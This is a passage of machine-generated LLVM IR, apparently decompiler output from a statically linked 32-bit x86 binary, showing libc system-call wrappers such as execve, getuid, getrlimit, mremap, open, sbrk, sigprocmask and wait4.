  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dbd4, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_2()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dbdc = load i32, i32* @edi, align 4
  store i32 %v0_804dbdc, i32* %stack_var_-4, align 4
  %v4_804dbe0 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804dbe0, i32* %edi.global-to-local, align 4
  %v0_804dbec = load i32, i32* @ebx, align 4
  %v5_804dbf4 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_804dbf4 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_804dbf4 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_804dbf4, [1 x i8*] %v8_804dbf4)
  store i32 %v9_804dbf4, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_804dbf4, -4095
  br i1 %tmp12, label %dec_label_pc_804dc0c, label %dec_label_pc_804dc00

dec_label_pc_804dc00:                             ; preds = %entry
  %v1_804dc00 = call i32 @__errno_location(i32 %v0_804dbec)
  %v0_804dc05 = load i32, i32* %edi.global-to-local, align 4
  %v1_804dc05 = sub i32 0, %v0_804dc05
  %v2_804dc07 = inttoptr i32 %v1_804dc00 to i32*
  store i32 %v1_804dc05, i32* %v2_804dc07, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dc0c

dec_label_pc_804dc0c:                             ; preds = %entry, %dec_label_pc_804dc00
  %v0_804dc0c = phi i32 [ %v9_804dbf4, %entry ], [ -1, %dec_label_pc_804dc00 ]
  %v2_804dc0e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dc0e, i32* @edx, align 4
  %v2_804dc10 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dc10, i32* %edi.global-to-local, align 4
  ret i32 %v0_804dc0c

; uselistorder directives
  uselistorder i32 %v9_804dbf4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dc0c, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804dc17 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804dc1e = call i32 @getrlimit(i32 7, i32 %v2_804dc17)
  store i32 256, i32* @edx, align 4
  %v2_804dc2b = icmp slt i32 %v2_804dc1e, 0
  br i1 %v2_804dc2b, label %dec_label_pc_804dc33, label %dec_label_pc_804dc2f

dec_label_pc_804dc2f:                             ; preds = %entry
  %v3_804dc2f = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804dc2f, i32* @edx, align 4
  br label %dec_label_pc_804dc33

dec_label_pc_804dc33:                             ; preds = %entry, %dec_label_pc_804dc2f
  %v0_804dc33 = phi i32 [ 256, %entry ], [ %v3_804dc2f, %dec_label_pc_804dc2f ]
  ret i32 %v0_804dc33

; uselistorder directives
  uselistorder label %dec_label_pc_804dc33, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dc3c = load i32, i32* @ebx, align 4
  store i32 %v0_804dc3c, i32* %stack_var_-4, align 4
  %v1_804dc45 = call i32 @int80_syscall(i32 202)
  store i32 %v1_804dc45, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804dc45, -4095
  br i1 %tmp6, label %dec_label_pc_804dc5c, label %dec_label_pc_804dc50

dec_label_pc_804dc50:                             ; preds = %entry
  %v0_804dc50 = load i32, i32* %stack_var_-4, align 4
  %v1_804dc50 = call i32 @__errno_location(i32 %v0_804dc50)
  %v0_804dc55 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dc55 = sub i32 0, %v0_804dc55
  %v2_804dc57 = inttoptr i32 %v1_804dc50 to i32*
  store i32 %v1_804dc55, i32* %v2_804dc57, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dc5c

dec_label_pc_804dc5c:                             ; preds = %entry, %dec_label_pc_804dc50
  %v0_804dc5c = phi i32 [ %v1_804dc45, %entry ], [ -1, %dec_label_pc_804dc50 ]
  %v2_804dc60 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dc60, i32* @ebx, align 4
  ret i32 %v0_804dc5c

; uselistorder directives
  uselistorder i32 %v1_804dc45, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dc5c, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dc64 = load i32, i32* @ebx, align 4
  store i32 %v0_804dc64, i32* %stack_var_-4, align 4
  %v1_804dc6d = call i32 @int80_syscall(i32 201)
  store i32 %v1_804dc6d, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804dc6d, -4095
  br i1 %tmp6, label %dec_label_pc_804dc84, label %dec_label_pc_804dc78

dec_label_pc_804dc78:                             ; preds = %entry
  %v0_804dc78 = load i32, i32* %stack_var_-4, align 4
  %v1_804dc78 = call i32 @__errno_location(i32 %v0_804dc78)
  %v0_804dc7d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dc7d = sub i32 0, %v0_804dc7d
  %v2_804dc7f = inttoptr i32 %v1_804dc78 to i32*
  store i32 %v1_804dc7d, i32* %v2_804dc7f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dc84

dec_label_pc_804dc84:                             ; preds = %entry, %dec_label_pc_804dc78
  %v0_804dc84 = phi i32 [ %v1_804dc6d, %entry ], [ -1, %dec_label_pc_804dc78 ]
  %v2_804dc88 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dc88, i32* @ebx, align 4
  ret i32 %v0_804dc84

; uselistorder directives
  uselistorder i32 %v1_804dc6d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dc84, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dc8c = load i32, i32* @ebx, align 4
  store i32 %v0_804dc8c, i32* %stack_var_-4, align 4
  %v1_804dc95 = call i32 @int80_syscall(i32 200)
  store i32 %v1_804dc95, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804dc95, -4095
  br i1 %tmp6, label %dec_label_pc_804dcac, label %dec_label_pc_804dca0

dec_label_pc_804dca0:                             ; preds = %entry
  %v0_804dca0 = load i32, i32* %stack_var_-4, align 4
  %v1_804dca0 = call i32 @__errno_location(i32 %v0_804dca0)
  %v0_804dca5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dca5 = sub i32 0, %v0_804dca5
  %v2_804dca7 = inttoptr i32 %v1_804dca0 to i32*
  store i32 %v1_804dca5, i32* %v2_804dca7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dcac

dec_label_pc_804dcac:                             ; preds = %entry, %dec_label_pc_804dca0
  %v0_804dcac = phi i32 [ %v1_804dc95, %entry ], [ -1, %dec_label_pc_804dca0 ]
  %v2_804dcb0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dcb0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804dcac

; uselistorder directives
  uselistorder i32 %v1_804dc95, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dcac, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dcb4 = load i32, i32* @ebx, align 4
  store i32 %v0_804dcb4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804dcc7 = call i32 @int80_syscall(i32 191)
  store i32 %v1_804dcc7, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804dcc7, -4095
  br i1 %tmp8, label %dec_label_pc_804dce0, label %dec_label_pc_804dcd4

dec_label_pc_804dcd4:                             ; preds = %entry
  %v0_804dcd4 = load i32, i32* %stack_var_-4, align 4
  %v1_804dcd4 = call i32 @__errno_location(i32 %v0_804dcd4)
  %v0_804dcd9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dcd9 = sub i32 0, %v0_804dcd9
  %v2_804dcdb = inttoptr i32 %v1_804dcd4 to i32*
  store i32 %v1_804dcd9, i32* %v2_804dcdb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dce0

dec_label_pc_804dce0:                             ; preds = %entry, %dec_label_pc_804dcd4
  %v0_804dce0 = phi i32 [ %v1_804dcc7, %entry ], [ -1, %dec_label_pc_804dcd4 ]
  %v2_804dce4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dce4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804dce0

; uselistorder directives
  uselistorder i32 %v1_804dcc7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dce0, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dce8 = load i32, i32* @ebx, align 4
  store i32 %v0_804dce8, i32* %stack_var_-4, align 4
  %v1_804dcf1 = call i32 @int80_syscall(i32 199)
  store i32 %v1_804dcf1, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804dcf1, -4095
  br i1 %tmp6, label %dec_label_pc_804dd08, label %dec_label_pc_804dcfc

dec_label_pc_804dcfc:                             ; preds = %entry
  %v0_804dcfc = load i32, i32* %stack_var_-4, align 4
  %v1_804dcfc = call i32 @__errno_location(i32 %v0_804dcfc)
  %v0_804dd01 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dd01 = sub i32 0, %v0_804dd01
  %v2_804dd03 = inttoptr i32 %v1_804dcfc to i32*
  store i32 %v1_804dd01, i32* %v2_804dd03, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dd08

dec_label_pc_804dd08:                             ; preds = %entry, %dec_label_pc_804dcfc
  %v0_804dd08 = phi i32 [ %v1_804dcf1, %entry ], [ -1, %dec_label_pc_804dcfc ]
  %v2_804dd0c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dd0c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804dd08

; uselistorder directives
  uselistorder i32 %v1_804dcf1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804dd08, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804dd10 = load i32, i32* @edi, align 4
  %v0_804dd11 = load i32, i32* @esi, align 4
  store i32 %v0_804dd11, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_804dd29 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_804dd31 = call i32 @mremap(i32 %v0_804dd29, i32 %v0_804dd11, i32 %v0_804dd10, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_804dd29, i32* @ebx, align 4
  store i32 %v6_804dd31, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_804dd31, -4095
  br i1 %tmp11, label %dec_label_pc_804dd49, label %dec_label_pc_804dd3d

dec_label_pc_804dd3d:                             ; preds = %entry
  %v1_804dd3d = call i32 @__errno_location(i32 %v0_804dd29)
  %v0_804dd42 = load i32, i32* %esi.global-to-local, align 4
  %v1_804dd42 = sub i32 0, %v0_804dd42
  %v2_804dd44 = inttoptr i32 %v1_804dd3d to i32*
  store i32 %v1_804dd42, i32* %v2_804dd44, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804dd49

dec_label_pc_804dd49:                             ; preds = %entry, %dec_label_pc_804dd3d
  %v0_804dd49 = phi i32 [ %v6_804dd31, %entry ], [ -1, %dec_label_pc_804dd3d ]
  %v2_804dd4b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dd4b, i32* @edx, align 4
  %v2_804dd4c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804dd4c, i32* @esi, align 4
  store i32 %v0_804dd10, i32* @edi, align 4
  ret i32 %v0_804dd49

; uselistorder directives
  uselistorder i32 %v6_804dd31, { 1, 0, 2 }
  uselistorder i32 %v0_804dd29, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dd49, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dd50 = load i32, i32* @ebx, align 4
  store i32 %v0_804dd50, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804dd63 = call i32 @munmap(i32 %v0_804dd50, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_804dd63, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v4_804dd63, -4095
  br i1 %tmp8, label %dec_label_pc_804dd7c, label %dec_label_pc_804dd70

dec_label_pc_804dd70:                             ; preds = %entry
  %v0_804dd70 = load i32, i32* %stack_var_-4, align 4
  %v1_804dd70 = call i32 @__errno_location(i32 %v0_804dd70)
  %v0_804dd75 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dd75 = sub i32 0, %v0_804dd75
  %v2_804dd77 = inttoptr i32 %v1_804dd70 to i32*
  store i32 %v1_804dd75, i32* %v2_804dd77, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804dd7c

dec_label_pc_804dd7c:                             ; preds = %entry, %dec_label_pc_804dd70
  %v0_804dd7c = phi i32 [ %v4_804dd63, %entry ], [ -1, %dec_label_pc_804dd70 ]
  %v2_804dd7e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804dd7e, i32* @edx, align 4
  %v2_804dd80 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dd80, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804dd7c

; uselistorder directives
  uselistorder i32 %v4_804dd63, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804dd7c, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804dd84 = load i32, i32* @ebx, align 4
  store i32 %v0_804dd84, i32* %stack_var_-4, align 4
  %v4_804dd88 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_804dd88, i32* %ebx.global-to-local, align 4
  %v6_804dd97 = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_804dd97, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v6_804dd97, -4095
  br i1 %tmp10, label %dec_label_pc_804ddb0, label %dec_label_pc_804dda4

dec_label_pc_804dda4:                             ; preds = %entry
  %v0_804dda4 = load i32, i32* %stack_var_-4, align 4
  %v1_804dda4 = call i32 @__errno_location(i32 %v0_804dda4)
  %v0_804dda9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804dda9 = sub i32 0, %v0_804dda9
  %v2_804ddab = inttoptr i32 %v1_804dda4 to i32*
  store i32 %v1_804dda9, i32* %v2_804ddab, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ddb0

dec_label_pc_804ddb0:                             ; preds = %entry, %dec_label_pc_804dda4
  %v0_804ddb0 = phi i32 [ %v6_804dd97, %entry ], [ -1, %dec_label_pc_804dda4 ]
  %v2_804ddb2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804ddb2, i32* @edx, align 4
  %v2_804ddb4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ddb4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804ddb0

; uselistorder directives
  uselistorder i32 %v6_804dd97, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ddb0, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804ddb9 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804ddbf = sdiv i32 %sext, 16777216
  store i32 %v4_804ddbf, i32* @ecx, align 4
  %v4_804ddc3 = ptrtoint i8* %arg1 to i32
  %v3_804ddc7 = and i32 %arg2, 64
  %v4_804ddc7 = icmp eq i32 %v3_804ddc7, 0
  br i1 %v4_804ddc7, label %dec_label_pc_804ddd8, label %dec_label_pc_804ddcc

dec_label_pc_804ddcc:                             ; preds = %entry
  %phitmp = urem i32 %arg3, 65536
  br label %dec_label_pc_804ddd8

dec_label_pc_804ddd8:                             ; preds = %entry, %dec_label_pc_804ddcc
  %v0_804ddd8 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_804ddcc ]
  store i32 %v0_804ddd8, i32* @edx, align 4
  store i32 %v4_804ddc3, i32* %ebx.global-to-local, align 4
  %v5_804dde3 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804ddbf)
  store i32 %v5_804dde3, i32* %ebx.global-to-local, align 4
  %tmp16 = icmp ult i32 %v5_804dde3, -4095
  br i1 %tmp16, label %dec_label_pc_804ddfb, label %dec_label_pc_804ddef

dec_label_pc_804ddef:                             ; preds = %dec_label_pc_804ddd8
  %v1_804ddef = call i32 @__errno_location(i32 %v0_804ddb9)
  %v0_804ddf4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ddf4 = sub i32 0, %v0_804ddf4
  %v2_804ddf6 = inttoptr i32 %v1_804ddef to i32*
  store i32 %v1_804ddf4, i32* %v2_804ddf6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ddfb

dec_label_pc_804ddfb:                             ; preds = %dec_label_pc_804ddd8, %dec_label_pc_804ddef
  %v0_804ddfb = phi i32 [ %v5_804dde3, %dec_label_pc_804ddd8 ], [ -1, %dec_label_pc_804ddef ]
  store i32 %v0_804ddb9, i32* @ebx, align 4
  ret i32 %v0_804ddfb

; uselistorder directives
  uselistorder i32 %v5_804dde3, { 1, 0, 2 }
  uselistorder i32 %v4_804ddbf, { 1, 0 }
  uselistorder i32 %v0_804ddb9, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804ddfb, { 1, 0 }
  uselistorder label %dec_label_pc_804ddd8, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804de13 = inttoptr i32 %arg1 to i8*
  %v4_804de13 = call i32 @__libc_open(i8* %v3_804de13, i32 577, i32 %arg2)
  ret i32 %v4_804de13

; uselistorder directives
  uselistorder i32 (i8*, i32, i32)* @__libc_open, { 0, 2, 1 }
  uselistorder i32 577, { 1, 0, 2 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804de1d = load i32, i32* @ebx, align 4
  %v0_804de21 = load i32, i32* @global_var_8056a04.388, align 4
  %v1_804de21 = icmp eq i32 %v0_804de21, 0
  %v1_804de2c = icmp eq i1 %v1_804de21, false
  br i1 %v1_804de2c, label %dec_label_pc_804de3f, label %dec_label_pc_804de2e

dec_label_pc_804de2e:                             ; preds = %entry
  %v1_804de33 = call i32 @__GI_brk(i32 0)
  %v2_804de3b = icmp slt i32 %v1_804de33, 0
  br i1 %v2_804de3b, label %dec_label_pc_804de61, label %dec_label_pc_804de2e.dec_label_pc_804de3f_crit_edge

dec_label_pc_804de2e.dec_label_pc_804de3f_crit_edge: ; preds = %dec_label_pc_804de2e
  %v0_804de41.pre = load i32, i32* @global_var_8056a04.388, align 4
  br label %dec_label_pc_804de3f

dec_label_pc_804de3f:                             ; preds = %dec_label_pc_804de2e.dec_label_pc_804de3f_crit_edge, %entry
  %v0_804de4f = phi i32 [ %v0_804de41.pre, %dec_label_pc_804de2e.dec_label_pc_804de3f_crit_edge ], [ %v0_804de21, %entry ]
  %v1_804de3f = icmp eq i32 %arg1, 0
  %v1_804de46 = icmp eq i1 %v1_804de3f, false
  br i1 %v1_804de46, label %dec_label_pc_804de4c, label %dec_label_pc_804de48

dec_label_pc_804de48:                             ; preds = %dec_label_pc_804de3f
  br label %dec_label_pc_804de64

dec_label_pc_804de4c:                             ; preds = %dec_label_pc_804de3f
  store i32 %v0_804de4f, i32* @ebx, align 4
  %v2_804de51 = add i32 %v0_804de4f, %arg1
  %v1_804de55 = call i32 @__GI_brk(i32 %v2_804de51)
  %v2_804de5d = icmp slt i32 %v1_804de55, 0
  %v1_804de5f = icmp eq i1 %v2_804de5d, false
  br i1 %v1_804de5f, label %dec_label_pc_804de4c.dec_label_pc_804de64_crit_edge, label %dec_label_pc_804de61

dec_label_pc_804de4c.dec_label_pc_804de64_crit_edge: ; preds = %dec_label_pc_804de4c
  %v0_804de64.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804de64

dec_label_pc_804de61:                             ; preds = %dec_label_pc_804de4c, %dec_label_pc_804de2e
  br label %dec_label_pc_804de64

dec_label_pc_804de64:                             ; preds = %dec_label_pc_804de4c.dec_label_pc_804de64_crit_edge, %dec_label_pc_804de48, %dec_label_pc_804de61
  %v0_804de64 = phi i32 [ %v0_804de64.pre, %dec_label_pc_804de4c.dec_label_pc_804de64_crit_edge ], [ %v0_804de4f, %dec_label_pc_804de48 ], [ -1, %dec_label_pc_804de61 ]
  %v2_804de66 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804de66, i32* @edx, align 4
  store i32 %v0_804de1d, i32* @ebx, align 4
  ret i32 %v0_804de64

; uselistorder directives
  uselistorder i32 %v0_804de4f, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_804de64, { 2, 0, 1 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804de6d = load i32, i32* @esi, align 4
  %v4_804de71 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804de71, i32* @ecx, align 4
  %v2_804de7d = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804de7d, label %dec_label_pc_804de96, label %dec_label_pc_804de81

dec_label_pc_804de81:                             ; preds = %entry
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_804de96, label %dec_label_pc_804de86

dec_label_pc_804de86:                             ; preds = %dec_label_pc_804de81
  %v1_804de86 = call i32 @__errno_location(i32 %v0_804de6d)
  %v1_804de8b = inttoptr i32 %v1_804de86 to i32*
  store i32 22, i32* %v1_804de8b, align 4
  br label %dec_label_pc_804debd

dec_label_pc_804de96:                             ; preds = %dec_label_pc_804de81, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804de9b = load i32, i32* @ebx, align 4
  %v7_804dea3 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804de9b, i32* @ebx, align 4
  store i32 %v7_804dea3, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_804dea3, -4095
  br i1 %tmp12, label %dec_label_pc_804debd, label %dec_label_pc_804deaf

dec_label_pc_804deaf:                             ; preds = %dec_label_pc_804de96
  %v1_804deaf = call i32 @__errno_location(i32 %v0_804de9b)
  %v0_804deb4 = load i32, i32* %esi.global-to-local, align 4
  %v1_804deb4 = sub i32 0, %v0_804deb4
  %v2_804deb6 = inttoptr i32 %v1_804deaf to i32*
  store i32 %v1_804deb4, i32* %v2_804deb6, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804debd

dec_label_pc_804debd:                             ; preds = %dec_label_pc_804deaf, %dec_label_pc_804de96, %dec_label_pc_804de86
  %storemerge = phi i32 [ -1, %dec_label_pc_804de86 ], [ %v7_804dea3, %dec_label_pc_804de96 ], [ -1, %dec_label_pc_804deaf ]
  %v2_804debd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804debd, i32* @edx, align 4
  store i32 %v0_804de6d, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_804dea3, { 1, 0, 2 }
  uselistorder i32 %v0_804de9b, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804dec4 = load i32, i32* @edi, align 4
  %v0_804dec5 = load i32, i32* @esi, align 4
  store i32 %v0_804dec5, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_804ded9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804dee1 = call i32 @wait4(i32 %v0_804ded9, i32 %v0_804dec5, i32 %v0_804dec4, i32 %tmp5)
  store i32 %v0_804ded9, i32* @ebx, align 4
  store i32 %v4_804dee1, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_804dee1, -4095
  br i1 %tmp10, label %dec_label_pc_804def9, label %dec_label_pc_804deed

dec_label_pc_804deed:                             ; preds = %entry
  %v1_804deed = call i32 @__errno_location(i32 %v0_804ded9)
  %v0_804def2 = load i32, i32* %esi.global-to-local, align 4
  %v1_804def2 = sub i32 0, %v0_804def2
  %v2_804def4 = inttoptr i32 %v1_804deed to i32*
  store i32 %v1_804def2, i32* %v2_804def4, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804def9

dec_label_pc_804def9:                             ; preds = %entry, %dec_label_pc_804deed
  %v0_804def9 = phi i32 [ %v4_804dee1, %entry ], [ -1, %dec_label_pc_804deed ]
  %v2_804defb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804defb, i32* @edx, align 4
  %v2_804defc = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804defc, i32* @esi, align 4
  store i32 %v0_804dec4, i32* @edi, align 4
  ret i32 %v0_804def9

; uselistorder directives
  uselistorder i32 %v4_804dee1, { 1, 0, 2 }
  uselistorder i32 %v0_804ded9, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804def9, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80569e4.389 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_804df13 = icmp eq i32 %tmp5, 0
  %v1_804df15 = icmp eq i1 %v1_804df13, false
  br i1 %v1_804df15, label %dec_label_pc_804df1d, label %dec_label_pc_804df17

dec_label_pc_804df17:                             ; preds = %entry
  %v2_804df17 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_804df1d

dec_label_pc_804df1d:                             ; preds = %entry, %dec_label_pc_804df17
  %v0_804df39 = phi i32 [ %tmp5, %entry ], [ %v2_804df17, %dec_label_pc_804df17 ]
  %v0_804df21 = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_804df17 ]
  %v2_804df1d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_804df21, i32* %stack_var_-4, align 4
  store i32 %v2_804df1d, i32* %stack_var_-8, align 4
